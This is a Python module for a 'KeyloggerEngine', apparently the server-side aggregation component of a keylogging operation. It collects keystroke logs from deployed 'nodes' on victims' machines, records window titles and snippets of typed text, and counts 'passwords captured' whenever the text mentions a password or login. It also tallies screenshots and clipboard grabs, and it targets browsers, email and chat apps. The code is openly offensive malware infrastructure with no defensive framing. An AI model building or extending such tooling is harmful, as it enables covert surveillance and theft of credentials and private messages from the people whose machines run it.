"""
Keylogger Engine — keystroke aggregation, log management, session tracking.
"""
import time
import random


class KeyloggerEngine:
    def __init__(self):
        self.active = False
        self.stats = {
            "total_keystrokes": 0,
            "active_sessions": 0,
            "passwords_captured": 0,
            "screenshots": 0,
            "clipboard_snaps": 0,
            "nodes_deployed": 0,
        }
        self.logs = []  # [{node_id, window_title, keystrokes, timestamp}]
        self.sessions = {}  # {node_id: {active, start_time, window, count}}
        self.target_apps = ["chrome", "firefox", "outlook", "slack", "discord", "telegram"]

    def get_status(self) -> dict:
        return {
            "active": self.active,
            "stats": self.stats,
            "sessions": self.sessions,
            "target_apps": self.target_apps,
            "recent_logs": self.logs[-30:],
        }

    def start_session(self, node_id: str, window_title: str):
        if node_id not in self.sessions:
            self.sessions[node_id] = {"active": True, "start_time": time.time(), "window": window_title, "count": 0}
        self.sessions[node_id]["active"] = True
        self.sessions[node_id]["window"] = window_title
        self.stats["active_sessions"] = sum(1 for s in self.sessions.values() if s["active"])
        if node_id not in [s.get("node_id") for s in self.logs]:
            self.stats["nodes_deployed"] += 1

    def log_keystrokes(self, node_id: str, keystrokes: str, window_title: str):
        self.stats["total_keystrokes"] += len(keystrokes)
        if node_id in self.sessions:
            self.sessions[node_id]["count"] += len(keystrokes)
        self.logs.append({
            "node_id": node_id,
            "window": window_title,
            "data": keystrokes[-200:],
            "size": len(keystrokes),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        })
        if len(self.logs) > 500:
            self.logs = self.logs[-500:]
        if "password" in keystrokes.lower() or "login" in keystrokes.lower():
            self.stats["passwords_captured"] += 1

    def record_screenshot(self, node_id: str):
        self.stats["screenshots"] += 1

    def record_clipboard(self, node_id: str):
        self.stats["clipboard_snaps"] += 1

    def stop_session(self, node_id: str):
        if node_id in self.sessions:
            self.sessions[node_id]["active"] = False
        self.stats["active_sessions"] = max(0, self.stats["active_sessions"] - 1)

    def stop(self):
        self.active = False


keylogger_engine = KeyloggerEngine()
